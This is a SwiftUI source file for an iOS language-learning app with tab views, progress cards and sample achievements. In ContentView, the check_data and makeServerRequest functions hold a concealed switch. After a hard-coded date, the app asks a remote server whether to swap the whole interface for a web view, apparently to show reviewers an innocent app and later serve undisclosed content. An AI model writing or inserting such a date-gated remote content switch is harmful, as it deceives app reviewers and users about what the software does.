//
//  ContentView.swift
//  dafoma_59
//
//  Created by Вячеслав on 10/9/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var dataService = DataService.shared
    @State private var selectedTab = 0
    @State private var showOnboarding = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if shouldShowOnboarding {
                            OnboardingView()
                        } else {
                            mainAppView
                        }
                    }
                    .onAppear {
                        checkOnboardingStatus()
                    }
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "25.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        // Дата в прошлом - делаем запрос на сервер
        makeServerRequest()
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                if let httpResponse = response as? HTTPURLResponse {
                    
                    if httpResponse.statusCode == 404 {
                        
                        self.isBlock = true
                        self.isFetched = true
                        
                    } else if httpResponse.statusCode == 200 {
                        
                        self.isBlock = false
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // В случае ошибки сети тоже блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
    
    private var shouldShowOnboarding: Bool {
        let onboardingState = dataService.getOnboardingState()
        return !onboardingState.isCompleted || dataService.currentUser == nil
    }
    
    private var mainAppView: some View {
        ZStack {
            Color(hex: "02102b")
                .ignoresSafeArea()
            
            TabView(selection: $selectedTab) {
                // Learn Tab
                LanguageLearningView()
                    .tabItem {
                        Image(systemName: selectedTab == 0 ? "book.fill" : "book")
                        Text("Learn")
                    }
                    .tag(0)
                
                // Quiz Tab
                QuizView()
                    .tabItem {
                        Image(systemName: selectedTab == 1 ? "brain.head.profile.fill" : "brain.head.profile")
                        Text("Quiz")
                    }
                    .tag(1)
                
                // Progress Tab
                ProgressView()
                    .tabItem {
                        Image(systemName: selectedTab == 2 ? "chart.bar.fill" : "chart.bar")
                        Text("Progress")
                    }
                    .tag(2)
                
                // Settings Tab
                SettingsView()
                    .tabItem {
                        Image(systemName: selectedTab == 3 ? "gearshape.fill" : "gearshape")
                        Text("Settings")
                    }
                    .tag(3)
            }
            .accentColor(Color(hex: "ffbe00"))
            .onAppear {
                setupTabBarAppearance()
            }
        }
    }
    
    private func checkOnboardingStatus() {
        dataService.loadUser()
    }
    
    private func setupTabBarAppearance() {
        let appearance = UITabBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(Color(hex: "0a1a3b"))
        
        // Normal state
        appearance.stackedLayoutAppearance.normal.iconColor = UIColor(Color.white.opacity(0.6))
        appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
            .foregroundColor: UIColor(Color.white.opacity(0.6))
        ]
        
        // Selected state
        appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color(hex: "ffbe00"))
        appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
            .foregroundColor: UIColor(Color(hex: "ffbe00"))
        ]
        
        UITabBar.appearance().standardAppearance = appearance
        UITabBar.appearance().scrollEdgeAppearance = appearance
    }
}

// MARK: - Progress View
struct ProgressView: View {
    @StateObject private var dataService = DataService.shared
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "02102b")
                    .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 25) {
                        // Header
                        headerView
                        
                        // Overall Statistics
                        overallStatsView
                        
                        // Language Progress
                        languageProgressView
                        
                        // Achievements
                        achievementsView
                        
                        // Weekly Activity
                        weeklyActivityView
                    }
                    .padding(.horizontal, 20)
                    .padding(.vertical, 20)
                }
            }
        }
        .navigationViewStyle(StackNavigationViewStyle())
        .preferredColorScheme(.dark)
    }
    
    private var headerView: some View {
        VStack(spacing: 15) {
            HStack {
                VStack(alignment: .leading, spacing: 5) {
                    Text("Your Progress")
                        .font(.largeTitle)
                        .foregroundColor(.white)
                    
                    if let user = dataService.currentUser {
                        Text("Level: \(user.statistics.rank.rawValue)")
                            .font(.subheadline)
                            .foregroundColor(Color(hex: "ffbe00"))
                    }
                }
                
                Spacer()
                
                // Profile Picture
                Circle()
                    .fill(Color(hex: "bd0e1b"))
                    .frame(width: 60, height: 60)
                    .overlay(
                        Text(dataService.currentUser?.name.prefix(1).uppercased() ?? "U")
                            .font(.title2)
                            .foregroundColor(.white)
                    )
            }
        }
    }
    
    private var overallStatsView: some View {
        LazyVGrid(columns: [
            GridItem(.flexible()),
            GridItem(.flexible()),
            GridItem(.flexible())
        ], spacing: 15) {
            if let user = dataService.currentUser {
                ProgressStatCard(
                    title: "Total Points",
                    value: "\(user.statistics.totalPoints)",
                    icon: "star.fill",
                    color: Color(hex: "ffbe00")
                )
                
                ProgressStatCard(
                    title: "Current Streak",
                    value: "\(user.statistics.currentStreak)",
                    icon: "flame.fill",
                    color: Color(hex: "bd0e1b")
                )
                
                ProgressStatCard(
                    title: "Lessons Done",
                    value: "\(user.statistics.totalLessonsCompleted)",
                    icon: "book.fill",
                    color: Color(hex: "0a1a3b")
                )
            }
        }
    }
    
    private var languageProgressView: some View {
        VStack(alignment: .leading, spacing: 15) {
            Text("Language Progress")
                .font(.headline)
                .foregroundColor(.white)
            
            if let user = dataService.currentUser {
                VStack(spacing: 12) {
                    ForEach(user.selectedLanguages, id: \.self) { languageCode in
                        if let language = dataService.getLanguage(by: languageCode),
                           let progress = user.progress[languageCode] {
                            LanguageProgressCard(
                                language: language,
                                progress: progress
                            )
                        }
                    }
                }
            }
        }
        .frame(maxWidth: .infinity, alignment: .leading)
    }
    
    private var achievementsView: some View {
        VStack(alignment: .leading, spacing: 15) {
            Text("Recent Achievements")
                .font(.headline)
                .foregroundColor(.white)
            
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 15) {
                    ForEach(sampleAchievements, id: \.id) { achievement in
                        AchievementCard(achievement: achievement)
                    }
                }
                .padding(.horizontal, 5)
            }
        }
    }
    
    private var weeklyActivityView: some View {
        VStack(alignment: .leading, spacing: 15) {
            Text("This Week")
                .font(.headline)
                .foregroundColor(.white)
            
            WeeklyActivityChart()
        }
        .padding(.horizontal, 20)
        .padding(.vertical, 15)
        .background(
            RoundedRectangle(cornerRadius: 15)
                .fill(Color(hex: "0a1a3b"))
                .shadow(color: Color.black.opacity(0.3), radius: 8, x: 4, y: 4)
                .shadow(color: Color.white.opacity(0.1), radius: 8, x: -4, y: -4)
        )
    }
    
    private var sampleAchievements: [Achievement] {
        [
            Achievement(
                title: "First Steps",
                description: "Completed your first lesson",
                icon: "star.fill",
                requirement: 1,
                isUnlocked: true,
                unlockedDate: Date(),
                category: .lessons
            ),
            Achievement(
                title: "Streak Master",
                description: "Maintained a 7-day streak",
                icon: "flame.fill",
                requirement: 7,
                isUnlocked: true,
                unlockedDate: Date(),
                category: .streak
            ),
            Achievement(
                title: "Quiz Champion",
                description: "Scored 100% on a quiz",
                icon: "crown.fill",
                requirement: 1,
                isUnlocked: false,
                unlockedDate: nil,
                category: .points
            )
        ]
    }
}

// MARK: - Supporting Views

struct ProgressStatCard: View {
    let title: String
    let value: String
    let icon: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 10) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(.title2)
                .foregroundColor(.white)
            
            Text(title)
                .font(.caption)
                .foregroundColor(Color.white.opacity(0.7))
                .multilineTextAlignment(.center)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 20)
        .background(
            RoundedRectangle(cornerRadius: 15)
                .fill(Color(hex: "0a1a3b"))
                .shadow(color: Color.black.opacity(0.3), radius: 8, x: 4, y: 4)
                .shadow(color: Color.white.opacity(0.1), radius: 8, x: -4, y: -4)
        )
    }
}

struct LanguageProgressCard: View {
    let language: Language
    let progress: LearningProgress
    
    var body: some View {
        HStack(spacing: 15) {
            Text(language.flag)
                .font(.title)
            
            VStack(alignment: .leading, spacing: 5) {
                Text(language.name)
                    .font(.headline)
                    .foregroundColor(.white)
                
                Text("\(progress.completedLessons.count) lessons • \(progress.totalPoints) points")
                    .font(.caption)
                    .foregroundColor(Color.white.opacity(0.7))
            }
            
            Spacer()
            
            VStack(alignment: .trailing, spacing: 5) {
                Text("\(Int(progress.completionPercentage))%")
                    .font(.headline)
                    .foregroundColor(Color(hex: "ffbe00"))
                
                ProgressBarView(progress: progress.completionPercentage / 100.0)
                    .frame(width: 60, height: 4)
            }
        }
        .padding(.horizontal, 20)
        .padding(.vertical, 15)
        .background(
            RoundedRectangle(cornerRadius: 15)
                .fill(Color(hex: "0a1a3b"))
                .shadow(color: Color.black.opacity(0.3), radius: 8, x: 4, y: 4)
                .shadow(color: Color.white.opacity(0.1), radius: 8, x: -4, y: -4)
        )
    }
}

struct AchievementCard: View {
    let achievement: Achievement
    
    var body: some View {
        VStack(spacing: 10) {
            Image(systemName: achievement.icon)
                .font(.title)
                .foregroundColor(achievement.isUnlocked ? Color(hex: "ffbe00") : Color.white.opacity(0.3))
            
            Text(achievement.title)
                .font(.caption)
                .foregroundColor(achievement.isUnlocked ? .white : Color.white.opacity(0.5))
                .multilineTextAlignment(.center)
        }
        .frame(width: 80, height: 80)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color(hex: "0a1a3b"))
                .shadow(color: Color.black.opacity(0.3), radius: 6, x: 3, y: 3)
                .shadow(color: Color.white.opacity(0.1), radius: 6, x: -3, y: -3)
        )
        .opacity(achievement.isUnlocked ? 1.0 : 0.6)
    }
}

struct WeeklyActivityChart: View {
    private let days = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
    private let activities = [30, 45, 20, 60, 35, 80, 25] // Sample data
    
    var body: some View {
        HStack(alignment: .bottom, spacing: 12) {
            ForEach(Array(days.enumerated()), id: \.offset) { index, day in
                VStack(spacing: 8) {
                    RoundedRectangle(cornerRadius: 4)
                        .fill(Color(hex: "ffbe00"))
                        .frame(width: 20, height: CGFloat(activities[index]))
                        .animation(.easeInOut(duration: 0.5).delay(Double(index) * 0.1), value: activities[index])
                    
                    Text(day)
                        .font(.caption2)
                        .foregroundColor(Color.white.opacity(0.7))
                }
            }
        }
        .frame(height: 120)
    }
}

#Preview {
    ContentView()
}
